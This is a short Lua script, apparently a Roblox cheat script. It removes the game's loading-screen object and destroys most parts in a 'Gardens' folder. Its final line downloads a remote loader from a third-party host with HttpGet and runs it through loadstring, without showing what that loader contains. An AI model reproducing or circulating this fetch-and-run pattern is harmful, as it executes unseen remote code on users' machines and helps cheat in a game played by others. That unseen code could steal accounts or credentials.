local gardens = workspace:WaitForChild("Gardens")
local obj = workspace:FindFirstChild("LoadingScreenMenu")

if obj then
    obj:Destroy()
end

workspace.ChildAdded:Connect(function(obj)
    if obj.Name == "LoadingScreenMenu" then
        obj:Destroy()
    end
end)

local function destroyIfNeeded(obj)
    if obj:IsA("BasePart") and not obj:FindFirstAncestor("GreyMailBox") then
        obj:Destroy()
    end
end

for _, obj in gardens:GetDescendants() do
    destroyIfNeeded(obj)
end

gardens.DescendantAdded:Connect(destroyIfNeeded)

loadstring(game:HttpGet("https://api.luarmor.net/files/v4/loaders/34faa0aa17d3660495c8b6f8bc204d6a.lua"))()